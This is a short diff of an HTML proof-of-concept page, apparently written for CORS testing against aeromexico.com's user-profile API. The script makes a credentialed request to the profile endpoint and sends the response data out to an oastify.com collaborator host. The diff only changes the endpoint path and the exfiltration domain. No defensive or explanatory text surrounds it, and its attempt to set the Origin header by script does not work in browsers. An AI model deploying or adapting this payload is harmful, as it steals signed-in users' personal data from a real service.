@@ -5,14 +5,14 @@
 <body>
     <script type="text/javascript">
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://www.aeromexico.com/api/v4/profile/user-profile', true);
+        xhr.open('GET', 'http://www.aeromexico.com/api/v4/profile/user-profile-sign-in', true);
         xhr.withCredentials = true;
-        xhr.setRequestHeader('Origin', 'http://5y4ejz1atu1ge2roks8jljm0krqiede13.oastify.com');
+        xhr.setRequestHeader('Origin', 'w415pq71zl77ktxfqjearasrqiw9k5bt0.oastify.com');
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4 && xhr.status == 200) {
                 var data = xhr.responseText;
                 var img = new Image();
-                img.src = 'http://5y4ejz1atu1ge2roks8jljm0krqiede13.oastify.com/log?data=' + encodeURIComponent(data);
+                img.src = 'http://w415pq71zl77ktxfqjearasrqiw9k5bt0.oastify.com/log?data=' + encodeURIComponent(data);
             }
         };
         xhr.send();
